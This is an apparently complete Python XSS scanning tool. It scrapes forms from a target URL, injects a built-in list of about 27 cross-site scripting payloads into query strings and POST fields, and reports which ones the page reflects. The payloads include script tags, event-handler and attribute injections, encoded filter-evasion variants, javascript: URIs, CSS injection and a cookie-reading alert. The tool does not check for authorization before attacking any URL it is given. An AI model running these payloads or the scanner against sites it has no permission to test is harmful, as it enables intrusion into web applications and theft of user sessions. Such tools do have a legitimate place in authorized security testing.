import requests
import sys
import time
import json
from bs4 import BeautifulSoup
import os

# ASCII Banner with Emojis
ascii_banner = r"""
 __  __  _____   _____      😃🚀
 \ \/ / / ____| / ____|    🔍💻
  \  / | (___  | (___      🛠️✨
  /  \  \___ \  \___ \      🔐🕵️
 /  /\ \ ____) | ____) |   📊✅
/_/  \_\_____/ |_____/     🛡️🌐
"""

def animate_ascii_banner(banner):
    """Display the ASCII banner with an animation effect."""
    for line in banner.splitlines():
        print(line)
        time.sleep(0.1)

def scrape_form_fields(url):
    """Scrape form fields from the target URL."""
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        form_data = []
        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            fields = {inp.get('name'): inp.get('value', '') for inp in inputs if inp.get('name')}
            form_data.append({'action': action, 'method': method, 'fields': fields})
        return form_data
    except requests.exceptions.RequestException as e:
        print(f"❌ Error scraping forms: {e}")
        return []

def test_payloads(url, payloads, method="GET", data=None):
    """Test payloads for XSS vulnerabilities."""
    vulnerable = False
    vulnerable_payloads = []
    for payload in payloads:
        if method.upper() == "POST":
            for key in data.keys():
                data[key] = payload
            response = requests.post(url, data=data)
        else:
            injection_url = f"{url}?q={payload}"
            response = requests.get(injection_url)
        if payload in response.text:
            print(f"\n🚨 Vulnerable to XSS: {url} with payload: {payload}")
            vulnerable = True
            vulnerable_payloads.append(payload)
    return vulnerable, vulnerable_payloads

def scan_xss(url, payloads, results):
    print(f"🔍 Scanning URL: {url}")
    forms = scrape_form_fields(url)
    vulnerable = False
    vulnerable_payloads = []

    print("\n🌐 Testing GET requests...")
    is_vulnerable, payloads_found = test_payloads(url, payloads)
    vulnerable |= is_vulnerable
    vulnerable_payloads.extend(payloads_found)

    for form in forms:
        print(f"\n📝 Testing form with action: {form['action']} and method: {form['method'].upper()}")
        action_url = url + form['action']
        if form['method'] == 'post':
            is_vulnerable, payloads_found = test_payloads(action_url, payloads, method="POST", data=form['fields'])
            vulnerable |= is_vulnerable
            vulnerable_payloads.extend(payloads_found)

    results.append({
        "url": url,
        "vulnerable": vulnerable,
        "payloads": vulnerable_payloads if vulnerable else []
    })

    if not vulnerable:
        print("✔️ No XSS vulnerabilities found.")

def load_payloads_from_file(file_path):
    if not os.path.exists(file_path):
        print(f"❌ File not found: {file_path}")
        return []

    with open(file_path, 'r') as file:
        payloads = [line.strip() for line in file.readlines() if line.strip()]
    print(f"📂 Loaded {len(payloads)} payloads from {file_path}")
    return payloads

def scan_from_file(file_path, payloads, results):
    if not os.path.exists(file_path):
        print(f"❌ File not found: {file_path}")
        return

    with open(file_path, 'r') as file:
        urls = file.readlines()

    for url in urls:
        url = url.strip()
        if url:
            print(f"\n🌐 Scanning URL: {url}")
            scan_xss(url, payloads, results)

def save_results_to_json(results, output_file="xss_results.json"):
    with open(output_file, 'w') as file:
        json.dump(results, file, indent=4)
    print(f"\n📄 Results saved to: {output_file}")

def generate_report(results, html_report_file="report.html"):
    with open(html_report_file, 'w') as html_file:
        html_file.write("<html><head><title>XSS Report</title></head><body>")
        html_file.write("<h1>XSS Vulnerability Report</h1><pre>")
        html_file.write(json.dumps(results, indent=4))
        html_file.write("</pre></body></html>")

    print(f"📄 HTML report generated: {html_report_file}")

def main():
    animate_ascii_banner(ascii_banner)
    payloads = []
    while True:
        print("\n1️⃣ Use default payloads")
        print("2️⃣ Add custom payloads")
        print("3️⃣ Load payloads from a .txt file")
        print("4️⃣ Proceed with scan")
        choice = input("👉 Choose an option: ")
        if choice == '1':
            payloads = [
                # Basic Payloads
    "<script>alert('XSS')</script>",
    "'\"><script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>",
    "<svg/onload=alert('XSS')>",

    # Encoded Variants
    "%3Cscript%3Ealert%28'XSS'%29%3C%2Fscript%3E",
    "<scr\0ipt>alert('XSS')</scr\0ipt>",
    "<svg onload=\u0061lert('XSS')>",

    # Attribute Injection
    "' onfocus='alert(\"XSS\")' autofocus='true",
    "'><svg/onload=alert('XSS')>",
    "'><img src=x onerror=alert('XSS')>",
    "' onmouseover='alert(\"XSS\")' style='position:absolute;top:0;left:0;width:100%;height:100%' ",

    # Event-based Payloads
    "<a href='javascript:alert(\"XSS\")'>Click Me</a>",
    "<body onload=alert('XSS')>",
    "<video><source onerror='alert(\"XSS\")'></video>",
    "<svg><animate attributeName='href' values='javascript:alert(\"XSS\")'></animate></svg>",

    # Context-Specific
    "';alert('XSS');//",
    "\";alert('XSS');//",
    "'+alert('XSS')+'",
    "</script><script>alert('XSS')</script>",

    # DOM-Based XSS
    "javascript:alert(document.cookie)",
    "data:text/html,<script>alert('XSS')</script>",
    "#<script>alert('XSS')</script>",

    # CSS Injection
    "<style>@import 'javascript:alert(\"XSS\")';</style>",
    "<style>body{background:url('javascript:alert(\"XSS\")')}</style>",
    "<style>body{background-image:url('data:image/svg+xml,<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"></svg>')}</style>",

    # Other Variants
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<details open ontoggle=alert('XSS')><summary>X</summary></details>"

            ]
            print("✅ Default payloads loaded.")
        elif choice == '2':
            custom_payload = input("✏️ Enter your custom payload: ")
            payloads.append(custom_payload)
            print("✔️ Custom payload added.")
        elif choice == '3':
            file_path = input("📂 Enter the path to the .txt file containing payloads: ")
            payloads = load_payloads_from_file(file_path)
        elif choice == '4':
            break
        else:
            print("❌ Invalid choice.")

    results = []

    scan_mode = input("🔧 Enter '1' to scan a single URL or '2' to scan from a .txt file: ")

    if scan_mode == '1':
        target_url = input("🌐 Enter the URL to scan: ")
        scan_xss(target_url, payloads, results)
    elif scan_mode == '2':
        file_path = input("📂 Enter the path to the .txt file containing URLs: ")
        scan_from_file(file_path, payloads, results)
    else:
        print("❌ Invalid choice. Please enter '1' or '2'.")

    save_results_to_json(results)

if __name__ == "__main__":
    main()
